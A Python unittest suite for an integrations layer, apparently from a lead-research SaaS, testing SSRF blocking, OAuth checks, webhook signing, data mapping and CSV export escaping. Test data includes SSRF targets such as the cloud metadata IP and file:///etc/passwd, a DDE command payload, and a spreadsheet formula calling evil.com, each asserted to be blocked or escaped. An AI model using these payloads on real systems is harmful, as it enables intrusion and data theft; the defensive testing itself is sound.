import json
import os
import sys
import time
import unittest
import uuid
from datetime import datetime, timezone

# Ensure project paths are in sys.path
BASE_DIR = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", ".."))
API_DIR = os.path.join(BASE_DIR, "apps", "api")
if BASE_DIR not in sys.path:
    sys.path.insert(0, BASE_DIR)
if API_DIR not in sys.path:
    sys.path.insert(0, API_DIR)

from fastapi.testclient import TestClient
from app.main import app
from app.db.base import Base
from app.db.session import sync_engine, SessionLocal, get_sync_db
from app.models.tenant import Workspace, Organization
from app.models.user import User
from app.models.integration import (
    IntegrationProvider,
    IntegrationConnection,
    IntegrationCredentialReference,
    IntegrationMapping,
    IntegrationFieldMapping,
    IntegrationJob,
    IntegrationConflict,
    WebhookEndpoint,
    WebhookEvent,
    APIKey,
    ConnectionStatus,
    ConflictResolution,
)
from app.services.permission_service import get_active_workspace, get_current_user

from packages.integrations.provider_registry import (
    ProviderRegistry,
    IntegrationProviderPlugin,
    ProviderCapability,
)
from packages.integrations.security_and_credentials import (
    SecretManager,
    OAuth2FlowHandler,
    APIKeyManager,
    SSRFProtection,
    SSRFProtectionError,
)
from packages.integrations.api_client_and_circuit_breaker import (
    CircuitBreaker,
    CircuitBreakerOpenError,
    ExternalAPIClient,
)
from packages.integrations.webhook_engine import (
    WebhookEngine,
    WebhookVerificationError,
)
from packages.integrations.data_mapping_and_transformation_engine import (
    DataMappingEngine,
)
from packages.integrations.sync_and_conflict_engine import (
    SyncAndConflictEngine,
)
from packages.integrations.export_safety_engine import (
    ExportSafetyEngine,
)
from packages.integrations.google_sheets_sync_service import (
    GoogleSheetsSyncService,
)


class TestPhase27Integrations(unittest.TestCase):
    """
    Comprehensive test suite covering Phase 27:
    Enterprise Integrations, API Ecosystem & External System Connectivity
    """

    @classmethod
    def setUpClass(cls):
        Base.metadata.create_all(bind=sync_engine)
        cls.db = SessionLocal()

        cls.org_id = str(uuid.uuid4())
        cls.ws_id = str(uuid.uuid4())
        cls.user_id = str(uuid.uuid4())

        cls.org = Organization(id=cls.org_id, name="Phase27 Test Org", slug=f"p27-org-{uuid.uuid4().hex[:6]}")
        cls.ws = Workspace(id=cls.ws_id, organization_id=cls.org_id, name="Phase27 Test Workspace", slug=f"p27-ws-{uuid.uuid4().hex[:6]}")
        cls.user = User(
            id=cls.user_id,
            email=f"p27_{uuid.uuid4().hex[:6]}@example.com",
            password_hash="secret_pwd_p27",
            first_name="Integration",
            last_name="Architect",
            is_active=True,
            is_superuser=True,
        )

        cls.db.add(cls.org)
        cls.db.add(cls.ws)
        cls.db.add(cls.user)
        cls.db.commit()

        app.dependency_overrides[get_sync_db] = lambda: cls.db
        app.dependency_overrides[get_active_workspace] = lambda: cls.ws
        app.dependency_overrides[get_current_user] = lambda: cls.user
        cls.client = TestClient(app)

    @classmethod
    def tearDownClass(cls):
        cls.db.close()
        app.dependency_overrides.clear()

    def test_01_provider_registry_and_capabilities(self):
        """Verifies provider catalog, lookup, and capability assertions."""
        reg = ProviderRegistry()
        providers = reg.list_providers()
        self.assertGreaterEqual(len(providers), 5)

        sheets_p = reg.get_provider("google_sheets")
        self.assertIsNotNone(sheets_p)
        self.assertTrue(reg.check_capability("google_sheets", ProviderCapability.SYNC.value))
        self.assertFalse(reg.check_capability("google_sheets", "NON_EXISTENT_CAPABILITY"))

        # Health check
        health = sheets_p.health_check()
        self.assertEqual(health["status"], "HEALTHY")

    def test_02_secret_manager_encryption_decryption(self):
        """Encrypts sensitive tokens and verifies accurate decryption."""
        token = "ghp_secure_github_personal_access_token_12345"
        encrypted = SecretManager.encrypt_secret(token)
        self.assertTrue(encrypted.startswith("enc_"))
        self.assertNotEqual(token, encrypted)

        decrypted = SecretManager.decrypt_secret(encrypted)
        self.assertEqual(token, decrypted)

    def test_03_ssrf_protection_blocked_ips(self):
        """Rejects localhost, loopbacks, private subnets, and cloud metadata IPs."""
        unsafe_urls = [
            "http://localhost:8000/internal",
            "http://127.0.0.1/admin",
            "http://169.254.169.254/latest/meta-data/",
            "http://10.0.1.20/db",
            "http://192.168.1.1/router",
            "file:///etc/passwd",
            "gopher://127.0.0.1:6379",
        ]
        for url in unsafe_urls:
            is_safe, err = SSRFProtection.validate_outbound_url(url)
            self.assertFalse(is_safe, f"Expected {url} to be blocked")
            self.assertIsNotNone(err)

    def test_04_ssrf_protection_allowed_public_urls(self):
        """Approves valid public HTTPS targets."""
        safe_urls = [
            "https://api.github.com/orgs/odoo",
            "https://sheets.googleapis.com/v4/spreadsheets",
            "https://hooks.slack.com/services/T00/B00/X00",
        ]
        for url in safe_urls:
            is_safe, err = SSRFProtection.validate_outbound_url(url)
            self.assertTrue(is_safe, f"Expected {url} to be allowed: {err}")
            self.assertIsNone(err)

    def test_05_oauth2_pkce_and_state_verification(self):
        """Generates PKCE S256 challenges and verifies tamper-resistant state tokens."""
        pkce = OAuth2FlowHandler.generate_pkce_pair()
        self.assertEqual(pkce["code_challenge_method"], "S256")
        self.assertGreater(len(pkce["code_verifier"]), 40)
        self.assertGreater(len(pkce["code_challenge"]), 30)

        # State token
        state = OAuth2FlowHandler.generate_state_token(self.ws_id, "google_sheets")
        is_valid = OAuth2FlowHandler.validate_state_token(state, self.ws_id, "google_sheets")
        self.assertTrue(is_valid)

        # Tampered state
        is_invalid = OAuth2FlowHandler.validate_state_token(state + "_tampered", self.ws_id, "google_sheets")
        self.assertFalse(is_invalid)

    def test_06_oauth2_redirect_uri_validation(self):
        """Rejects arbitrary or unapproved OAuth redirect destinations."""
        self.assertTrue(OAuth2FlowHandler.validate_redirect_uri("https://app.leadnexus.ai/oauth/callback"))
        self.assertFalse(OAuth2FlowHandler.validate_redirect_uri("https://malicious-attacker.com/steal-code"))

    def test_07_api_key_generation_and_hashing(self):
        """Generates scoped API keys with prefix and hashes secrets for storage."""
        scopes = ["companies:read", "leads:read"]
        key_data = APIKeyManager.generate_api_key(self.ws_id, scopes)
        plaintext = key_data["plaintext_key"]
        self.assertTrue(plaintext.startswith("lnx_live_"))

        # Verify hash match
        computed_hash = APIKeyManager.hash_key(plaintext)
        self.assertEqual(computed_hash, key_data["key_hash"])

        # Scope validation
        self.assertTrue(APIKeyManager.validate_scopes(scopes, "companies:read"))
        self.assertFalse(APIKeyManager.validate_scopes(scopes, "research:run"))

    def test_08_circuit_breaker_state_transitions(self):
        """Transitions CLOSED -> OPEN after threshold failures, preventing cascading calls."""
        cb = CircuitBreaker(failure_threshold=3, cooldown_seconds=10.0)
        self.assertEqual(cb.state, "CLOSED")
        self.assertTrue(cb.can_execute())

        cb.record_failure()
        cb.record_failure()
        self.assertEqual(cb.state, "CLOSED")

        cb.record_failure()  # 3rd failure reaches threshold
        self.assertEqual(cb.state, "OPEN")
        self.assertFalse(cb.can_execute())

    def test_09_external_api_client_retry_policy(self):
        """Retries 429 and 503 errors, but rejects 401 without retries."""
        client = ExternalAPIClient(provider_id="test_provider")

        # Mock 401 Unauthorized (non-retryable)
        def mock_401(m, u, h, p):
            return 401, {"error": "Unauthorized API key"}

        res_401 = client.execute_request("GET", "https://api.github.com/user", mock_invoker=mock_401, max_retries=3)
        self.assertFalse(res_401["is_success"])
        self.assertEqual(res_401["status_code"], 401)
        self.assertEqual(res_401["attempts"], 1)  # Did not retry

        # Mock 429 Rate Limit recovering on attempt 2
        call_count = 0
        def mock_429_then_200(m, u, h, p):
            nonlocal call_count
            call_count += 1
            if call_count == 1:
                return 429, {"error": "Rate limit exceeded"}
            return 200, {"success": True}

        client2 = ExternalAPIClient(provider_id="test_provider_retry")
        res_retry = client2.execute_request("GET", "https://api.github.com/repos", mock_invoker=mock_429_then_200, max_retries=2)
        self.assertTrue(res_retry["is_success"])
        self.assertEqual(res_retry["status_code"], 200)
        self.assertEqual(res_retry["attempts"], 2)

    def test_10_webhook_signature_verification(self):
        """Verifies HMAC-SHA256 signature computation and rejects altered payloads."""
        secret = "super_secure_webhook_secret_key"
        payload_bytes = b'{"event":"research.completed","company_id":"123"}'

        sig = WebhookEngine.compute_hmac_signature(secret, payload_bytes)
        self.assertTrue(WebhookEngine.verify_inbound_signature(secret, payload_bytes, sig))

        # Altered payload must fail
        tampered_bytes = b'{"event":"research.completed","company_id":"999"}'
        self.assertFalse(WebhookEngine.verify_inbound_signature(secret, tampered_bytes, sig))

    def test_11_webhook_timestamp_replay_protection(self):
        """Rejects expired timestamps outside 5-minute replay drift window."""
        now_ts = str(int(time.time()))
        self.assertTrue(WebhookEngine.verify_timestamp(now_ts))

        # 10 minutes ago
        old_ts = str(int(time.time()) - 600)
        self.assertFalse(WebhookEngine.verify_timestamp(old_ts))

    def test_12_webhook_inbound_processing(self):
        """End-to-end inbound webhook parsing with payload hashing."""
        secret = "whsec_test_secret"
        payload = {"event_type": "repository.updated", "repo": "odoo/odoo"}
        raw_body = json.dumps(payload).encode("utf-8")
        sig = WebhookEngine.compute_hmac_signature(secret, raw_body)
        headers = {
            "X-LeadNexus-Signature": f"sha256={sig}",
            "X-LeadNexus-Timestamp": str(int(time.time())),
            "X-LeadNexus-Event": "repository.updated",
        }

        event = WebhookEngine.process_inbound_webhook(
            workspace_id=self.ws_id,
            provider="github",
            secret_key=secret,
            raw_body=raw_body,
            headers=headers,
        )
        self.assertEqual(event["event_type"], "repository.updated")
        self.assertTrue(event["signature_verified"])
        self.assertIsNotNone(event["payload_hash"])

    def test_13_webhook_outbound_preparation(self):
        """Prepares signed outbound webhook headers and body."""
        secret = "whsec_outbound_key"
        payload = {"alert": "ResearchCompleted", "lead_score": 92}
        headers, body = WebhookEngine.prepare_outbound_delivery(
            secret_key=secret,
            event_type="RESEARCH_COMPLETED",
            event_id="evt_test_101",
            payload=payload,
        )
        self.assertIn("X-LeadNexus-Signature", headers)
        self.assertEqual(headers["X-LeadNexus-Event"], "RESEARCH_COMPLETED")

    def test_14_data_mapping_field_transformations(self):
        """Applies safe, deterministic transformations: TRIM, NORMALIZE_DOMAIN, etc."""
        self.assertEqual(DataMappingEngine.apply_transformation("  Test Corp  ", "TRIM"), "Test Corp")
        self.assertEqual(DataMappingEngine.apply_transformation("https://www.example.com.au/about", "NORMALIZE_DOMAIN"), "example.com.au")
        self.assertEqual(DataMappingEngine.apply_transformation("JOHN.DOE@COMPANY.COM", "NORMALIZE_EMAIL"), "john.doe@company.com")
        self.assertEqual(DataMappingEngine.apply_transformation("+61 (02) 9876-5432", "NORMALIZE_PHONE"), "+610298765432")
        self.assertEqual(DataMappingEngine.apply_transformation("AU", "NORMALIZE_COUNTRY"), "Australia")
        self.assertEqual(DataMappingEngine.apply_transformation("US", "NORMALIZE_COUNTRY"), "United States")

    def test_15_data_mapping_required_fields_and_defaults(self):
        """Validates missing required fields raise error, while defaults populate correctly."""
        mappings = [
            {"source_field": "ext_name", "target_field": "name", "is_required": True},
            {"source_field": "ext_country", "target_field": "country", "default_value": "Australia"},
        ]
        # Missing required field
        with self.assertRaises(ValueError):
            DataMappingEngine.map_record({"ext_country": "NZ"}, mappings)

        # Populating with default
        result = DataMappingEngine.map_record({"ext_name": "Acme Co"}, mappings)
        self.assertEqual(result["name"], "Acme Co")
        self.assertEqual(result["country"], "Australia")

    def test_16_sync_reconciliation_database_wins(self):
        """Database Wins rule: canonical database values are preserved over conflicting external updates."""
        canon_val = "OmniRetail Solutions Pty Ltd"
        ext_val = "OmniRetail"
        reconciled, conflict = SyncAndConflictEngine.reconcile_field(
            field_name="name",
            canonical_value=canon_val,
            external_value=ext_val,
            policy_resolution=ConflictResolution.KEEP_CANONICAL.value,
        )
        self.assertEqual(reconciled, canon_val)
        self.assertIsNotNone(conflict)
        self.assertEqual(conflict["resolution"], ConflictResolution.KEEP_CANONICAL.value)

    def test_17_sync_conflict_detection(self):
        """Detects discrepancies between canonical dataset and external sync payload."""
        canon = {"omniretail.com.au": {"name": "OmniRetail Pty Ltd", "domain": "omniretail.com.au", "city": "Sydney"}}
        ext = {"omniretail.com.au": {"name": "OmniRetail Corp", "domain": "omniretail.com.au", "city": "Melbourne"}}

        eval_res = SyncAndConflictEngine.evaluate_sync_batch(canon, ext, match_key="domain")
        self.assertEqual(eval_res["records_found"], 1)
        self.assertEqual(eval_res["conflicts_count"], 2)  # name and city conflict

    def test_18_export_safety_csv_formula_injection(self):
        """Neutralizes formula injection characters (=, +, -, @, tab) by prepending single quote."""
        unsafe_cells = [
            "=SUM(A1:A10)",
            "+12345",
            "-CMD|' /C calc'!A0",
            "@IMPORTXML('http://evil.com')",
            "\tTAB_ATTACK",
        ]
        for cell in unsafe_cells:
            sanitized = ExportSafetyEngine.sanitize_csv_cell(cell)
            self.assertTrue(sanitized.startswith("'"), f"Failed to escape {cell}")

        # Safe CSV generation
        records = [{"name": "Acme", "formula": "=2+2", "website": "https://acme.com"}]
        csv_out = ExportSafetyEngine.generate_safe_csv(records)
        self.assertIn("'=2+2", csv_out)  # escaped formula

    def test_19_google_sheets_sync_preview(self):
        """Parses 2D sheet arrays, maintains stable leadnexus_id, and computes sync preview."""
        raw_rows = [
            ["leadnexus_id", "company_name", "primary_domain"],
            ["lnx_01", "Alpha Co", "alpha.com"],
            ["lnx_02", "Beta Co", "beta.com"],
        ]
        parsed = GoogleSheetsSyncService.parse_sheet_rows(raw_rows)
        self.assertEqual(len(parsed), 2)
        self.assertEqual(parsed[0]["leadnexus_id"], "lnx_01")
        self.assertEqual(parsed[1]["company_name"], "Beta Co")

        preview = GoogleSheetsSyncService.compute_sync_preview(parsed, [])
        self.assertEqual(preview["sheet_total_rows"], 2)
        self.assertTrue(preview["is_ready_to_sync"])

    def test_20_fastapi_integrations_routes(self):
        """Tests Phase 27 REST API endpoints."""
        # 1. List Providers
        providers_res = self.client.get("/api/v1/integrations/providers")
        self.assertEqual(providers_res.status_code, 200)
        self.assertGreaterEqual(len(providers_res.json()), 5)

        # 2. Create Connection with encrypted credential
        conn_res = self.client.post(
            "/api/v1/integrations/connections",
            json={
                "provider_id": "github",
                "name": "Production GitHub Telemetry",
                "auth_type": "API_KEY",
                "configuration": {"org": "odoo"},
                "credential_secret": "ghp_super_secret_pat_9876",
            },
        )
        self.assertEqual(conn_res.status_code, 200)
        conn_id = conn_res.json()["connection_id"]

        # 3. Test Connection Health
        health_res = self.client.post(f"/api/v1/integrations/connections/{conn_id}/test")
        self.assertEqual(health_res.status_code, 200)
        self.assertEqual(health_res.json()["status"], "HEALTHY")

        # 4. Create Field Mapping
        mapping_res = self.client.post(
            "/api/v1/integrations/mappings",
            json={
                "name": "Company Import Mapping",
                "target_entity": "COMPANY",
                "connection_id": conn_id,
                "field_mappings": [
                    {"source_field": "ExternalName", "target_field": "name", "transformation_rule": "TRIM", "is_required": True},
                    {"source_field": "URL", "target_field": "domain", "transformation_rule": "NORMALIZE_DOMAIN"},
                ],
            },
        )
        self.assertEqual(mapping_res.status_code, 200)

        # 5. Validate Field Mapping
        val_res = self.client.post(
            "/api/v1/integrations/mappings/validate",
            json={
                "field_mappings": [
                    {"source_field": "ExternalName", "target_field": "name", "transformation_rule": "TRIM", "is_required": True},
                    {"source_field": "URL", "target_field": "domain", "transformation_rule": "NORMALIZE_DOMAIN"},
                ],
                "sample_record": {"ExternalName": "  OmniRetail Pty Ltd  ", "URL": "https://www.omniretail.com.au/team"},
            },
        )
        self.assertEqual(val_res.status_code, 200)
        self.assertTrue(val_res.json()["is_valid"])
        self.assertEqual(val_res.json()["canonical_output"]["name"], "OmniRetail Pty Ltd")
        self.assertEqual(val_res.json()["canonical_output"]["domain"], "omniretail.com.au")

        # 6. Generate Scoped API Key
        key_res = self.client.post(
            "/api/v1/integrations/api-keys",
            json={"name": "BI Read-Only Key", "scopes": ["companies:read", "leads:read"]},
        )
        self.assertEqual(key_res.status_code, 200)
        self.assertIn("api_key", key_res.json())
        self.assertTrue(key_res.json()["api_key"].startswith("lnx_live_"))

        # 7. Safe CSV Export (Formula injection defense)
        csv_res = self.client.post(
            "/api/v1/integrations/export/safe-csv",
            json={
                "records": [{"company": "OmniRetail", "formula": "=SUM(A1:A5)"}],
            },
        )
        self.assertEqual(csv_res.status_code, 200)
        self.assertIn("'=SUM(A1:A5)", csv_res.text)


if __name__ == "__main__":
    unittest.main()
